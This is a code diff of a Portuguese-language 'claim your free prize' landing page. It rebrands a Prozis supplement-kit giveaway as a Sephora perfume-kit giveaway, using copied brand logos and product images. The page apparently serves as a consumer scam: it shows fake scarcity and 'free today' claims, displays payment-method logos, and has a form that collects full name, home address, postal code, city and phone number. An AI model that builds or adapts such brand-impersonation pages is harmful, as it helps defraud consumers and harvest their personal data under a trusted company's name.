@@ -4,11 +4,11 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Resgate do Prémio - Prozis</title>
-    <meta name="description" content="Resgate o seu Kit Prozis Grátis">
-    <link rel="stylesheet" href="style.css?v=38">
-    <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;600;700;800&display=swap" rel="stylesheet">
-    <link rel="icon" href="/assets/prozis-logo.svg" type="image/svg+xml">
+    <title>Resgate do Prémio - Sephora</title>
+    <meta name="description" content="Resgate o seu Kit Sephora Grátis">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
+        rel="stylesheet">
+    <link rel="icon" href="/assets/sephora-logo-white.png" type="image/png">
 
     <!-- Meta Pixel Code -->
     <script>
@@ -32,166 +32,341 @@
     <!-- End Meta Pixel Code -->
 
     <style>
+        :root {
+            --sephora-black: #000000;
+            --sephora-white: #ffffff;
+            --sephora-pink: #ffeef9;
+            /* Light Pink Accent */
+            --text-color: #000000;
+            --text-muted: #666666;
+        }
+
         body {
-            font-family: 'Exo 2', sans-serif;
-            background: #f5f5f5;
-            color: #111;
+            font-family: 'Inter', sans-serif;
+            background: var(--sephora-white);
+            color: var(--text-color);
             margin: 0;
             padding: 0;
             display: flex;
             flex-direction: column;
             min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
         }
 
-        /* Prozis Header */
+        /* --- Header --- */
         header {
             background: #000;
-            padding: 15px 0;
+            padding: 5px 0;
             text-align: center;
-            border-bottom: 3px solid #e32526;
+            border-bottom: 2px solid #ffebf6;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
             width: 100%;
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
 
         header img {
-            height: 30px;
+            height: 64px;
+            display: block;
+            margin: 0 auto;
         }
 
-        /* Product Container */
-        .product-card {
-            background: white;
-            max-width: 600px;
-            margin: 20px auto;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-            padding-bottom: 30px;
-        }
-
-        .product-image-area {
-            position: relative;
-            background: #fff;
+        /* --- Main Product Section --- */
+        .prize-hero {
+            max-width: 500px;
+            /* Mobile-first constraint */
+            width: 100%;
+            margin: 0 auto;
+            text-align: center;
             padding: 20px;
-            text-align: center;
-            border-bottom: 1px solid #eee;
+            box-sizing: border-box;
         }
 
-        .product-img {
-            max-width: 100%;
-            height: auto;
-            max-height: 400px;
-        }
-
-        .product-details {
-            padding: 20px 30px;
-            text-align: center;
+        .brand-label {
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            margin-bottom: 8px;
+            display: block;
         }
 
         .product-title {
             font-size: 24px;
             font-weight: 800;
+            /* Ultra Bold */
             text-transform: uppercase;
-            margin-bottom: 15px;
-            color: #000;
+            margin: 0 0 15px 0;
             line-height: 1.2;
+            letter-spacing: -0.5px;
         }
 
-        .price-tag {
-            margin: 15px 0;
+        /* --- Image Slider --- */
+        .slider-wrapper {
+            position: relative;
+            width: 100%;
+            margin-bottom: 25px;
+            overflow: hidden;
+            border-radius: 12px;
+            /* Smooth corners */
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            /* Premium shadow */
+        }
+
+        .slider-track {
+            display: flex;
+            overflow-x: auto;
+            scroll-snap-type: x mandatory;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: none;
+            /* Hide scrollbar Firefox */
+        }
+
+        .slider-track::-webkit-scrollbar {
+            display: none;
+            /* Hide scrollbar Chrome/Safari */
+        }
+
+        .slide {
+            flex: 0 0 100%;
+            scroll-snap-align: center;
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 400px;
+            /* Fixed height for consistency */
+        }
+
+        .slide img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            /* Ensure image fits nicely */
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .slider-indicators {
+            position: absolute;
+            bottom: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 8px;
+            z-index: 10;
+        }
+
+        .indicator {
+            width: 8px;
+            height: 8px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 50%;
+            transition: all 0.3s;
+        }
+
+        .indicator.active {
+            background: var(--sephora-black);
+            transform: scale(1.2);
+        }
+
+
+        /* --- Price Area --- */
+        .price-area {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 25px;
+            padding: 10px;
+            background: #fafafa;
+            border-radius: 50px;
+            display: inline-flex;
         }
 
         .old-price {
-            font-size: 18px;
+            font-size: 16px;
+            color: var(--text-muted);
             text-decoration: line-through;
-            color: #999;
-            margin-right: 10px;
+            font-weight: 500;
         }
 
-        .new-price {
-            font-size: 32px;
-            color: #e32526;
-            font-weight: 800;
-        }
-
-        .stock-warning {
-            color: #e32526;
+        .free-badge {
+            background-color: #00b67a;
+            /* Green Background */
+            color: #ffffff;
+            /* White Text */
             font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 25px;
-            display: inline-block;
-            background: rgba(227, 37, 38, 0.1);
-            padding: 5px 15px;
-            border-radius: 20px;
-        }
-
-        .btn-redeem {
-            background: #25a01c;
-            /* Green as requested */
-            color: white;
-            border: none;
-            padding: 18px 40px;
-            font-size: 20px;
             font-weight: 800;
             text-transform: uppercase;
-            border-radius: 5px;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(37, 160, 28, 0.4);
-            transition: all 0.2s;
-            width: 100%;
-            max-width: 400px;
+            letter-spacing: 0.5px;
+            padding: 5px 12px;
+            border-radius: 4px;
+            display: inline-block;
+            box-shadow: 0 4px 10px rgba(0, 182, 122, 0.3);
+            animation: pulse-green 1.5s infinite;
+            vertical-align: middle;
         }
 
-        .btn-redeem:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(37, 160, 28, 0.6);
-            background: #208a18;
+        @keyframes pulse-green {
+
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
         }
 
-        .description {
+        /* --- Detailed Content --- */
+        .content-block {
             text-align: left;
-            margin-top: 30px;
-            color: #555;
-            font-size: 14px;
-            line-height: 1.6;
+            margin-top: 10px;
             padding: 0 10px;
         }
 
-        .description p {
-            margin-bottom: 15px;
+        .section-header {
+            font-size: 14px;
+            font-weight: 800;
+            text-transform: uppercase;
+            border-bottom: 2px solid #000;
+            padding-bottom: 8px;
+            margin-bottom: 20px;
+            display: inline-block;
         }
 
-        .description ul {
-            list-style: none;
-            padding: 0;
+        .intro-text {
+            font-size: 15px;
+            font-weight: 500;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            color: #333;
+        }
+
+        .product-item {
+            margin-bottom: 25px;
+        }
+
+        .product-name {
+            font-size: 16px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+        }
+
+        .product-desc {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        .highlight-text {
+            font-size: 14px;
+            font-style: italic;
+            color: #666;
+            margin-top: 30px;
+            border-left: 3px solid var(--sephora-black);
+            padding-left: 15px;
             margin-bottom: 20px;
         }
 
-        .description li {
-            margin-bottom: 12px;
-            padding-left: 20px;
-            position: relative;
+        /* --- CTA Section --- */
+        .cta-container {
+            position: sticky;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 20px;
+            border-top: 1px solid #eee;
+            text-align: center;
+            width: 100%;
+            box-sizing: border-box;
+            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.05);
+            z-index: 90;
         }
 
-        .description li strong {
-            color: #000;
+        .btn-redeem {
+            background: #00b67a;
+            color: #ffffff;
+            border: none;
+            padding: 18px 30px;
+            font-family: 'Inter', sans-serif;
+            font-size: 18px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            max-width: 450px;
+            transition: transform 0.2s;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            animation: pulse-light 2s infinite;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
         }
 
-        .description small {
+        .btn-redeem:active {
+            transform: scale(0.98);
+        }
+
+        /* Pulse with Announcement Bar Pink shadow */
+        @keyframes pulse-light {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(0, 182, 122, 0.7);
+            }
+
+            50% {
+                transform: scale(1.02);
+                box-shadow: 0 0 0 15px rgba(0, 182, 122, 0);
+            }
+
+            100% {
+                box-shadow: 0 0 0 0 rgba(0, 182, 122, 0);
+            }
+        }
+
+        .shipping-note {
             display: block;
-            color: #999;
+            margin-top: 10px;
             font-size: 12px;
+            color: var(--text-muted);
+            font-weight: 500;
         }
 
-        /* Modal Styles */
+        /* --- Footer --- */
+        footer {
+            background: #000;
+            color: white;
+            padding: 40px 20px;
+            text-align: center;
+            margin-top: auto;
+            width: 100%;
+            border-top: 2px solid #ffebf6;
+            box-sizing: border-box;
+        }
+
+        footer p {
+            font-size: 12px;
+            opacity: 0.7;
+            margin: 0;
+        }
+
+        /* --- Modal Styles (Matching Branding) --- */
         .modal {
             display: none;
             position: fixed;
-            z-index: 100;
+            z-index: 200;
             left: 0;
             top: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(5px);
+            background-color: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
             align-items: center;
             justify-content: center;
         }
@@ -199,18 +374,19 @@
         .modal-content {
             background: white;
             padding: 30px;
-            border-radius: 10px;
+            border-radius: 12px;
             width: 90%;
-            max-width: 500px;
+            max-width: 450px;
             position: relative;
-            animation: slideUp 0.3s ease-out;
+            animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
             max-height: 90vh;
             overflow-y: auto;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
         }
 
         @keyframes slideUp {
             from {
-                transform: translateY(50px);
+                transform: translateY(40px);
                 opacity: 0;
             }
 
@@ -220,82 +396,95 @@
             }
         }
 
+        .close-modal {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 30px;
+            height: 30px;
+            background: #f5f5f5;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 18px;
+            color: #333;
+            font-weight: bold;
+        }
+
         .modal h3 {
-            margin-top: 0;
             text-transform: uppercase;
             font-weight: 800;
             color: #000;
             text-align: center;
-            margin-bottom: 20px;
+            margin-top: 10px;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #000;
+            display: inline-block;
+            padding-bottom: 5px;
         }
 
         .form-group {
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
 
         .form-group label {
             display: block;
-            margin-bottom: 5px;
-            font-weight: 600;
-            font-size: 13px;
+            margin-bottom: 8px;
+            font-weight: 700;
+            font-size: 12px;
+            text-transform: uppercase;
+            color: #333;
+            letter-spacing: 0.5px;
         }
 
         .input-wrapper {
             position: relative;
-            display: flex;
-            align-items: center;
         }
 
         .flag-icon {
             position: absolute;
-            left: 10px;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
             width: 24px;
-            height: 24px;
             z-index: 2;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-family: 'Exo 2', sans-serif;
-            font-size: 15px;
-            box-sizing: border-box;
+            display: flex;
+            align-items: center;
         }
 
         .input-with-icon {
-            padding-left: 45px !important;
-        }
-
-        .form-group input:focus {
-            outline: none;
-            border-color: #25a01c;
-        }
-
-        .close-modal {
-            position: absolute;
-            top: 15px;
-            right: 20px;
-            font-size: 24px;
-            cursor: pointer;
-            color: #999;
-        }
-
-        /* Footer override */
-        footer {
-            background: #000;
-            color: white;
-            padding: 40px 20px;
-            text-align: center;
-            margin-top: auto;
             width: 100%;
+            padding: 14px 14px 14px 48px !important;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            font-family: 'Inter', sans-serif;
+            font-size: 15px;
+            background: #fdfdfd;
+            transition: border 0.2s;
+            box-sizing: border-box;
         }
 
-        footer p {
-            font-size: 12px;
-            opacity: 0.7;
-            margin: 0;
+        .input-with-icon:focus {
+            outline: none;
+            border-color: #000;
+            background: #fff;
+        }
+
+        .btn-confirm {
+            background: var(--sephora-black);
+            color: var(--sephora-pink);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            font-weight: 700;
+            font-size: 16px;
+            text-transform: uppercase;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 10px;
+            letter-spacing: 1px;
         }
     </style>
 </head>
@@ -303,130 +492,137 @@
 <body>
 
     <header>
-        <img src="/assets/prozis-logo.svg" alt="Prozis">
+        <img src="/assets/sephora-logo-white.png" alt="Sephora">
     </header>
 
-    <div class="product-card">
-        <div class="product-image-area">
-            <img src="/assets/prozispremio.png" alt="Kit Completo Prozis" class="product-img">
-        </div>
+    <div class="prize-hero">
+        <span class="brand-label">Sephora Favorites</span>
+        <h1 class="product-title">Kit Ícones do Luxo – Perfumes Importados em Tamanho Máximo</h1>
 
-        <div class="product-details">
-            <h1 class="product-title">🏋️ Kit Completo Prozis – Nutrição & Performance</h1>
-
-            <div class="price-tag">
-                <span class="old-price">199.99€</span>
-                <span class="new-price">0.00€</span>
+        <!-- Image Slider -->
+        <div class="slider-wrapper">
+            <div class="slider-track" id="sliderTrack">
+                <!-- Slide 1: Main -->
+                <div class="slide">
+                    <img src="/perfumes.png" alt="Kit Ícones do Luxo">
+                </div>
+                <!-- Slide 2: YSL -->
+                <div class="slide">
+                    <img src="https://media.sephora.eu/content/dam/digital/pim/published/Y/YVES_SAINT_LAURENT/306747/70452-media_swatch.jpg?scaleWidth=undefined&scaleHeight=undefined&scaleMode=undefined"
+                        alt="YSL Black Opium">
+                </div>
+                <!-- Slide 3: Dior -->
+                <div class="slide">
+                    <img src="https://media.sephora.eu/content/dam/digital/pim/published/D/DIOR/469637/111109-media_swatch.jpg?scaleWidth=undefined&scaleHeight=undefined&scaleMode=undefined"
+                        alt="Dior Sauvage">
+                </div>
+                <!-- Slide 4: Lancome -->
+                <div class="slide">
+                    <img src="https://media.sephora.eu/content/dam/digital/pim/published/L/LANCO/254230/45891-media_swatch.jpg?scaleWidth=undefined&scaleHeight=undefined&scaleMode=undefined"
+                        alt="Lancôme La Vie Est Belle">
+                </div>
             </div>
 
-            <div class="stock-warning">⚠️ Apenas 3 unidades restantes</div>
+            <div class="slider-indicators" id="sliderIndicators">
+                <div class="indicator active" data-index="0"></div>
+                <div class="indicator" data-index="1"></div>
+                <div class="indicator" data-index="2"></div>
+                <div class="indicator" data-index="3"></div>
+            </div>
+        </div>
 
-            <button class="btn-redeem" onclick="openModal()">RESGATAR AGORA</button>
+        <div class="price-area">
+            <span class="old-price">149.99€</span>
+            <span class="free-badge">GRÁTIS HOJE</span>
+        </div>
 
-            <div class="description">
-                <p>Kit completo com suplementos, alimentos proteicos e acessório essencial, ideal para melhorar o
-                    desempenho, apoiar a recuperação muscular e trazer mais praticidade ao dia a dia.</p>
+        <!-- Detailed Content -->
+        <div class="content-block">
+            <div class="section-header">Conteúdo do Kit</div>
 
-                <h4 style="text-transform:uppercase; font-weight:700; color:#000; margin-bottom: 10px;">O que inclui:
-                </h4>
-                <ul>
-                    <li>
-                        <strong>100% Whey Hydro Isolate PRO 2000 g</strong> – proteína whey hidrolisada, de rápida
-                        absorção<br>
-                        <small>Preço antigo: ~94,99 €</small>
-                    </li>
-                    <li>
-                        <strong>Creatina MicronPure®️ 300 g</strong> – creatina monohidratada 100% pura e
-                        micronizada<br>
-                        <small>Preço antigo: ~38,99 €</small>
-                    </li>
-                    <li>
-                        <strong>Hot Cocoa Whey Protein 400 g</strong> – sabor Bolacha – bebida quente com proteína
-                        whey<br>
-                        <small>Preço antigo: ~12,99 €</small>
-                    </li>
-                    <li>
-                        <strong>Superb Granola 275 g</strong> – Chocolate de Leite e Avelã – granola crocante e
-                        saborosa<br>
-                        <small>Preço antigo: ~4,99 €</small>
-                    </li>
-                    <li>
-                        <strong>Peanut Butter 1000 g</strong> – 100% Amendoim – manteiga de amendoim natural, sem
-                        açúcares adicionados<br>
-                        <small>Preço antigo: ~7,99 €</small>
-                    </li>
-                    <li>
-                        <strong>Whey Choco Butter Duo 200 g</strong> – Cacau & Avelã – creme proteico para barrar<br>
-                        <small>Preço antigo: ~5,99 €</small>
-                    </li>
-                    <li>
-                        <strong>Real Protein Bar (x8)</strong> – Bolacha com Recheio de Chocolate – barras proteicas
-                        práticas para o dia a dia<br>
-                        <small>Preço antigo: ~14,99 €</small>
-                    </li>
-                    <li>
-                        <strong>Garrafa Neo Mixer 3.0</strong> – Tritan Neon Red – shaker resistente e prático<br>
-                        <small>Preço antigo: ~19,99 €</small>
-                    </li>
-                </ul>
+            <p class="intro-text">
+                Uma seleção exclusiva com três fragrâncias icónicas da perfumaria internacional, todas nas versões de
+                maior capacidade, para máxima presença, durabilidade e valor percebido.
+            </p>
 
-                <p><strong>Ideal para:</strong> treino, recuperação muscular e alimentação prática.<br>
-                    Grande variedade, excelente valor e tudo num só kit. 💪🔥</p>
+            <div class="product-item">
+                <div class="product-name">Dior Sauvage</div>
+                <div class="product-desc">Eau de Parfum 100 ml (Masculino)<br>
+                    Aroma intenso, fresco e amadeirado. Um dos perfumes masculinos mais vendidos do mundo, símbolo de
+                    confiança e sofisticação.</div>
+            </div>
 
-                <p style="font-size: 13px; margin-top: 20px; border-top: 1px solid #eee; padding-top: 10px;">
-                    <strong>Envio Expresso:</strong> Receba o seu kit em 24-48h úteis diretamente em sua casa.
-                </p>
+            <div class="product-item">
+                <div class="product-name">Yves Saint Laurent Black Opium</div>
+                <div class="product-desc">Eau de Parfum 90 ml (Feminino)<br>
+                    Fragrância envolvente e sensual, com assinatura doce e marcante. Um verdadeiro ícone do luxo
+                    feminino contemporâneo.</div>
+            </div>
+
+            <div class="product-item">
+                <div class="product-name">Lancôme La Vie Est Belle</div>
+                <div class="product-desc">Eau de Parfum 100 ml (Feminino)<br>
+                    Elegante, luminoso e sofisticado. Um clássico intemporal, reconhecido e desejado a nível mundial.
+                </div>
+            </div>
+
+            <div class="highlight-text">
+                Um kit premium que reúne três dos perfumes importados mais desejados do mundo, em tamanhos máximos.
+                Luxo, prestígio e reconhecimento imediato, ideal para quem procura uma experiência exclusiva ou um
+                presente de elevado impacto.
             </div>
         </div>
     </div>
 
+    <div class="cta-container">
+        <button class="btn-redeem" onclick="openModal()">
+            <!-- Gift Box SVG -->
+            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640">
+                <path fill="#ffffff"
+                    d="M385.5 132.8C393.1 119.9 406.9 112 421.8 112L424 112C446.1 112 464 129.9 464 152C464 174.1 446.1 192 424 192L350.7 192L385.5 132.8zM254.5 132.8L289.3 192L216 192C193.9 192 176 174.1 176 152C176 129.9 193.9 112 216 112L218.2 112C233.1 112 247 119.9 254.5 132.8zM344.1 108.5L320 149.5L295.9 108.5C279.7 80.9 250.1 64 218.2 64L216 64C167.4 64 128 103.4 128 152C128 166.4 131.5 180 137.6 192L96 192C78.3 192 64 206.3 64 224L64 256C64 273.7 78.3 288 96 288L544 288C561.7 288 576 273.7 576 256L576 224C576 206.3 561.7 192 544 192L502.4 192C508.5 180 512 166.4 512 152C512 103.4 472.6 64 424 64L421.8 64C389.9 64 360.3 80.9 344.1 108.4zM544 336L344 336L344 544L480 544C515.3 544 544 515.3 544 480L544 336zM296 336L96 336L96 480C96 515.3 124.7 544 160 544L296 544L296 336z" />
+            </svg>
+            RESGATAR MEU PRÉMIO
+        </button>
+        <span class="shipping-note">Oferta limitada ao stock existente</span>
+    </div>
+
     <footer>
-        <img src="assets/prozis-logo.svg"
-            style="height: 20px; opacity: 1; margin-bottom: 10px; filter: brightness(0) invert(1);">
-        <p>© 2024 Prozis.com. Todos os direitos reservados.</p>
-        <p>Preços e promoções sujeitos a alteração. IVA incluído à taxa legal.</p>
+        <img src="/assets/sephora-logo-white.png" style="width: 140px; opacity: 0.5; margin-bottom: 20px;">
+
+        <div style="font-size: 11px; color: #999; margin-bottom: 20px; line-height: 1.6;">
+            © 2024 Sephora. Todos os direitos reservados. · <a href="#"
+                style="color: #999; text-decoration: none;">Política de Privacidade</a> · <a href="#"
+                style="color: #999; text-decoration: none;">Termos e Condições</a><br>
+            Preços e promoções sujeitos a alteração. IVA incluído à taxa legal.
+        </div>
+
+        <div style="display: flex; justify-content: center; gap: 15px; align-items: center; opacity: 0.8;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Logo_MBWay.svg/1280px-Logo_MBWay.svg.png"
+                alt="MB WAY"
+                style="height: 25px; object-fit: contain; background: white; padding: 2px 5px; border-radius: 4px;">
+            <img src="https://www.multibanco.pt/wp-content/uploads/2025/01/Multibanco-Logo-CMYK.svg" alt="Multibanco"
+                style="height: 25px; object-fit: contain; background: white; padding: 2px 5px; border-radius: 4px;">
+        </div>
     </footer>
 
     <!-- Redemption Modal -->
     <div id="redemptionModal" class="modal">
         <div class="modal-content">
-            <span class="close-modal" onclick="closeModal()">&times;</span>
+            <div class="close-modal" onclick="closeModal()">&times;</div>
             <h3>Dados de Envio</h3>
-            <p style="text-align: center; font-size: 14px; color: #666; margin-bottom: 20px;">
-                Preencha os dados onde deseja receber o seu <strong>Kit Grátis</strong>.
-            </p>
 
             <form id="shippingForm" onsubmit="submitForm(event)">
                 <div class="form-group">
                     <label>Nome Completo</label>
                     <div class="input-wrapper">
                         <div class="flag-icon">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
-                                fill="none" stroke="#666" stroke-width="2" stroke-linecap="round"
-                                stroke-linejoin="round">
-                                <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path>
-                                <circle cx="12" cy="7" r="4"></circle>
+                            <!-- Name Icon (User Provided) -->
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640" width="18" height="18">
+                                <path fill="#888"
+                                    d="M320 312C386.3 312 440 258.3 440 192C440 125.7 386.3 72 320 72C253.7 72 200 125.7 200 192C200 258.3 253.7 312 320 312zM290.3 368C191.8 368 112 447.8 112 546.3C112 562.7 125.3 576 141.7 576L498.3 576C514.7 576 528 562.7 528 546.3C528 447.8 448.2 368 349.7 368L290.3 368z" />
                             </svg>
                         </div>
-                        <input type="text" name="name" required placeholder="Ex: João Silva" class="input-with-icon">
-                    </div>
-                </div>
-
-                <div class="form-group">
-                    <label>NIF (Número de Contribuinte)</label>
-                    <div class="input-wrapper">
-                        <div class="flag-icon">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
-                                fill="none" stroke="#666" stroke-width="2" stroke-linecap="round"
-                                stroke-linejoin="round">
-                                <rect x="2" y="5" width="20" height="14" rx="2"></rect>
-                                <line x1="2" y1="10" x2="22" y2="10"></line>
-                                <line x1="7" y1="15" x2="7.01" y2="15"></line>
-                                <line x1="11" y1="15" x2="13" y2="15"></line>
-                            </svg>
-                        </div>
-                        <input type="tel" name="nif" required pattern="[0-9]{9}" maxlength="9" placeholder="123456789"
-                            class="input-with-icon">
+                        <input type="text" name="name" required placeholder="Ex: Ana Silva" class="input-with-icon">
                     </div>
                 </div>
 
@@ -434,15 +630,13 @@
                     <label>Morada de Entrega</label>
                     <div class="input-wrapper">
                         <div class="flag-icon">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
-                                fill="none" stroke="#666" stroke-width="2" stroke-linecap="round"
-                                stroke-linejoin="round">
-                                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
-                                <polyline points="9 22 9 12 15 12 15 22"></polyline>
+                            <!-- Address Icon (User Provided) -->
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640" width="18" height="18">
+                                <path fill="#888"
+                                    d="M298.2 72.6C310.5 61.2 329.5 61.2 341.7 72.6L432 156.3L432 144C432 126.3 446.3 112 464 112L496 112C513.7 112 528 126.3 528 144L528 245.5L565.8 280.6C575.4 289.6 578.6 303.5 573.8 315.7C569 327.9 557.2 336 544 336L528 336L528 512C528 547.3 499.3 576 464 576L176 576C140.7 576 112 547.3 112 512L112 336L96 336C82.8 336 71 327.9 66.2 315.7C61.4 303.5 64.6 289.5 74.2 280.6L298.2 72.6zM304 384C277.5 384 256 405.5 256 432L256 528L384 528L384 432C384 405.5 362.5 384 336 384L304 384z" />
                             </svg>
                         </div>
-                        <input type="text" name="address" required placeholder="Ex: Rua da Liberdade, 123"
-                            class="input-with-icon">
+                        <input type="text" name="address" required placeholder="Rua, Nº, Andar" class="input-with-icon">
                     </div>
                 </div>
 
@@ -451,42 +645,47 @@
                         <label>Código Postal</label>
                         <div class="input-wrapper">
                             <div class="flag-icon">
-                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
-                                    fill="none" stroke="#666" stroke-width="2" stroke-linecap="round"
-                                    stroke-linejoin="round">
-                                    <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 0 18 0z"></path>
-                                    <circle cx="12" cy="10" r="3"></circle>
+                                <!-- Zip Icon (User Provided) -->
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640" width="18" height="18">
+                                    <path fill="#888"
+                                        d="M128 252.6C128 148.4 214 64 320 64C426 64 512 148.4 512 252.6C512 371.9 391.8 514.9 341.6 569.4C329.8 582.2 310.1 582.2 298.3 569.4C248.1 514.9 127.9 371.9 127.9 252.6zM320 320C355.3 320 384 291.3 384 256C384 220.7 355.3 192 320 192C284.7 192 256 220.7 256 256C256 291.3 284.7 320 320 320z" />
                                 </svg>
                             </div>
                             <input type="tel" id="zipInput" name="zip" required placeholder="0000-000" maxlength="8"
-                                class="input-with-icon">
+                                class="input-with-icon" style="padding-left: 45px !important;">
                         </div>
                     </div>
                     <div class="form-group" style="flex: 1;">
                         <label>Cidade</label>
                         <div class="input-wrapper">
                             <div class="flag-icon">
-                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
-                                    fill="none" stroke="#666" stroke-width="2" stroke-linecap="round"
-                                    stroke-linejoin="round">
-                                    <path d="M3 21h18"></path>
-                                    <rect x="5" y="7" width="14" height="14" rx="2"></rect>
-                                    <path d="M9 11h6"></path>
-                                    <path d="M9 15h6"></path>
-                                    <path d="M12 3v4"></path>
+                                <!-- City Icon (User Provided - Same as Address) -->
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640" width="18" height="18">
+                                    <path fill="#888"
+                                        d="M298.2 72.6C310.5 61.2 329.5 61.2 341.7 72.6L432 156.3L432 144C432 126.3 446.3 112 464 112L496 112C513.7 112 528 126.3 528 144L528 245.5L565.8 280.6C575.4 289.6 578.6 303.5 573.8 315.7C569 327.9 557.2 336 544 336L528 336L528 512C528 547.3 499.3 576 464 576L176 576C140.7 576 112 547.3 112 512L112 336L96 336C82.8 336 71 327.9 66.2 315.7C61.4 303.5 64.6 289.5 74.2 280.6L298.2 72.6zM304 384C277.5 384 256 405.5 256 432L256 528L384 528L384 432C384 405.5 362.5 384 336 384L304 384z" />
                                 </svg>
                             </div>
-                            <input type="text" name="city" required placeholder="Ex: Lisboa" class="input-with-icon">
+                            <input type="text" name="city" required placeholder="Ex: Lisboa" class="input-with-icon"
+                                style="padding-left: 45px !important;">
                         </div>
                     </div>
                 </div>
 
                 <div class="form-group">
-                    <label>Telemóvel (Para notificações)</label>
+                    <label>Telemóvel</label>
                     <div class="input-wrapper">
-                        <!-- PT Flag SVG -->
-                        <div class="flag-icon">
-                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+                        <!-- Phone Icon + Small Flag + Prefix Container -->
+                        <div class="phone-prefix-container"
+                            style="position: absolute; left: 12px; top: 50%; transform: translateY(-50%); display: flex; align-items: center; gap: 6px; pointer-events: none; z-index: 5;">
+                            <!-- Phone Icon (User Provided) -->
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640" width="16" height="16">
+                                <path fill="#888"
+                                    d="M144 128C144 92.7 172.7 64 208 64L432 64C467.3 64 496 92.7 496 128L496 512C496 547.3 467.3 576 432 576L208 576C172.7 576 144 547.3 144 512L144 128zM256 504C256 517.3 266.7 528 280 528L360 528C373.3 528 384 517.3 384 504C384 490.7 373.3 480 360 480L280 480C266.7 480 256 490.7 256 504zM432 128L208 128L208 432L432 432L432 128z" />
+                            </svg>
+
+                            <!-- Portugal Flag (Small & Faded) -->
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="16" height="16"
+                                style="opacity: 0.6;">
                                 <g fill="none">
                                     <path fill="#046200" d="M0 0h170.7v512H0z" />
                                     <path fill="#D21034" d="M170.7 0h341.3v512H170.7z" />
@@ -503,11 +702,13 @@
                                     </g>
                                 </g>
                             </svg>
+
+                            <!-- Fixed Prefix -->
+                            <span style="font-weight: 700; color: #333; font-size: 15px;">+351</span>
+                            <span style="width: 1px; height: 18px; background: #ddd; margin-left: 2px;"></span>
                         </div>
-                        <span
-                            style="position: absolute; left: 45px; font-weight: 600; color: #333; z-index: 2;">+351</span>
                         <input type="tel" id="phoneInput" name="phone" required placeholder="912 345 678"
